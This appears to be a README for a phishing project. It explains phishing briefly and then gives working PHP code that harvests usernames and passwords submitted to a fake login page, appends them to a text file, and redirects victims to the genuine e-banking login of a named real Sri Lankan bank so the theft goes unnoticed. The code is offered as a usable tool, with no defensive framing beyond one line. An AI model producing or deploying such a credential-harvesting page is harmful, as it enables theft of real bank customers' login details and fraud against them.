# phishing


What phishing website does?

Phishing is get sensitive data like passwords, credit card details using fake websites and emails. This is the good example to social 
engineering because this fake website same as the original web site. So user easily caught this unauthorized websites. 

for futher informations visit  https://unalupotha.blogspot.com/

How this web page work?

Once you visit this website you enter your user names passwords. All that cridentials can collect using txt file. This webpage create  
using html and php. 

Using this collect user cridentials and redirect them to that txt file.

<?php
 $username = $_POST["username"];
 $password = $_POST["passwd"];
 
 //Get credentials to .txt file
 $myfile = fopen("credentials.txt", "a") or die("Unable to open file!");
 $txt = "USERNAME = $username , PASSWORD = $password\n";
 fwrite($myfile, "\n". $txt);
 fclose($myfile);
 
 //Redirect the browser to original login page
 header("Location: https://www.ebank.peoplesbank.lk/eb/index.html");
 
 exit();

?>






